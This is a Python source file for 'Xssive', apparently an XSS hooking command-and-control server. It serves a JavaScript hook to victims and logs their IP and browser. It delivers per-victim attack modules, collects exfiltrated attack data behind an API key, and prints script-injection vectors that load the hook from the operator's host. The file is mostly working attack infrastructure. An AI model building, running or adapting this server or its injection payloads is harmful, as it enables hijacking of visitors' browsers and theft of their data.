#!/usr/bin/python
# -*- coding: utf-8 -*-
import web
import sys
import argparse
import time
import hashlib
from socket import gethostbyname,gethostname
from Xssive_DB import Database
from random import randint

#Defining Accessible Web Addresses
urls = ('/', 'Index', '/Hook', 'Hook','/favicon.ico','Fav','/Attack/(.*)',
	'Attack_Module', '/Command/(.*)', 'Command', '/Data/(.*)', 'Data','/Page', 'Page')

#Overwriting the run function to use a different port.
#Display server host IP address/port combo.
class XssiveWebProxy(web.application):
	def run(self, host, port=8080, *middleware):
		func = self.wsgifunc(*middleware)
		print('\n'+white+'Xssive 0.1 - Demo Framework.'+
			'\n-------------------\n'+regular)
		print ('Control interface Key: '+red+ api_key +regular+'\n')
		return web.httpserver.runsimple(func, (host, port))

#Handles Get request to server root & displays Xssive information.
class Index:
    def GET(self):
		data = "<h1>Xssive 0.1 - Demonstration Framework.</h1>"
		for key, value in web.ctx.env.iteritems():
			data+= '<pre>'+str(key)+' : '+str(value)
		
		# Test attacks by filling 
		#mydb.TEST_FILL()
		return data

#Display the favicon
class Fav:
	def GET(self):
		f = open("static/favicon.ico", 'rb') 
		favicon = f.read()
		f.close()
		return favicon		
		
#This page serves the javascript hook code.
#It also provides a victim id so the hook code knows where to check.
class Hook:
    def GET(self):
		#User Data
		data = {}
		text = ''
		#Retrieve the hook code
		try:
			f = open('hook/hook.js', "r")
			text = f.read()
			f.close()
		except IOError:
			print 'Could Not Open hook.js'
		
		#This code will be unique to every hook
		data['ip'] = web.ctx.env['REMOTE_ADDR']
		data['browser'] = web.ctx.env['HTTP_USER_AGENT']		
		data['datetime'] = int(time.time())
		
		#Store the initial hook data and assign a code
		code = mydb.Store_hook(data)
		host_addr = 'var host_addr = "'+host+'";\n'
		victim_id = 'var victim_id = "'+str(code)+'";\n'
		ctrl_key = 'var ctrl_key = "'+api_key+'";\n'
		#Return the dynamic hooking javascript.
		web.header('Content-Type', 'text/javascript')
		return host_addr + victim_id + ctrl_key + text

#This will present any loaded attack modules for each individual victim.
class Attack_Module:
	def GET(self,user):
		text = ''
		vicid = int(user)
		module_loaded = mydb.Get_Attack_Module(vicid)
		try:
			f = open(str(module_loaded[0]), "r")
			text = f.read()
			f.close()
			x = mydb.Attack_remove(vicid,module_loaded[1])
		except:
			print 'victimid: '+str(user)
		web.header('Content-Type', 'text/javascript')
		return text

#This class handles the commands sent to the Server.
class Command:
	def POST(self,key):
		if key == api_key:
			cmds = web.data()
			web.header('Content-Type', 'application/json')
			data = mydb.Exec_Command(cmds)
			return data
		else:
			web.header('Content-Type', 'application/json')
			return '{ "error": "Wrong Key provided."} '

#This class handles the input and output of data.
#It will be used by the Control Device to read returned attack data
#Attack modules can submit retrieved attack information in it also.
class Data:
	def POST(self,key):
		if key == api_key:
			web.header('Content-Type', 'application/json')
			attack_data = web.data()
			data = mydb.Attack_result(attack_data)
			return data
		else:
			web.header('Content-Type', 'application/json')
			return '{ "error": "Wrong Key provided."} '

	#Display information for control device.
	def GET(self,key):
		if key == api_key:
			web.header('Content-Type', 'application/json')
			return mydb.Attack_data()
		else:
			web.header('Content-Type', 'application/json')
			return '{ "error": "Wrong Key provided."} '

#For use with certain attack code.
class Page:
	def GET(self):
		text = 'No Data.'
		if args.PAGE != None:
			try:
				f = open(str(args.PAGE), "r")
				text = f.read()
				f.close()
			except:
				return 'File i/o error.'
		return text
				

#---------------Main Program----------------
if __name__ == "__main__":
	#Ansi terminal colours + Styles.
	underline = '\033[4m'
	red = '\033[31m'
	regular = '\033[0m'
	white = '\033[037m'

	#Parsing of command line arguments.		
	p = argparse.ArgumentParser(description='Xssive 0.1 - Demo Framework\n')
	p.add_argument('-p',dest='PORT',type=int,help='Specify a port.')
	p.add_argument('-H',dest='HOST',type=str,help='Specify where to run'+
			' proxy server. Default is the current host.')
	p.add_argument('-v',dest='VECTORS',action='store_true',help='Display'+
			' example injection vectors.')
	p.add_argument('-mysql',dest='DBINFO',type=str,help='Provide info'+
			'rmation for an external Database to use in the'+
			' format "host,user,passwd,db". By default this tool'+
			' will use a local sql lite database.')
	p.add_argument('-db',dest='FILE',type=str, help='Provide a named sql'+
			' lite database to use')
	p.add_argument('-page', dest='PAGE', type=str, help='Provide a webpage'
			+' , the contents will be displayed at the /Page location.'+
			'For use with attack code.')
	args = p.parse_args()
	
	#Default port or user defined port
	port = 8664
	if args.PORT != None:
		port = args.PORT
	
	#Default host/server or user defined.
	host = gethostbyname(gethostname())
	if args.HOST != None:
		host = args.HOST
	
	#Default database file
	db_file = 'db/xssive.db'
	if args.FILE != None:
		db_file = args.FILE
		
	
	#Is database information provided
	if args.DBINFO == None:
		#Create a local sqllite database.
		mydb = Database('sqlite',db_file)
		mydb.Create_DB()
	else:
		#Create Mysql database
		mydb = Database('mysql',args.DBINFO)
		mydb.Create_DB()
	
	#Display example hook injection vectors
	if args.VECTORS == True:
		print '\n'+ underline +'Attack Vector list.'+ regular
		print red
		print '<script src=http://'+host+'/Hook></script>'
		print 'with(document)getElementsByTagName("head")[0].appendChild'+				'(createElement("script")).src="//'+host+'/Hook";'
		print regular,

	#Generate control interface Api key.
	api_key = hashlib.md5(str(randint(10000000,1000000000))).hexdigest()
	
	#Run the web proxy
	xssproxy = XssiveWebProxy(urls, globals())
	xssproxy.run(host,port)
	print '\n Goodbye!'
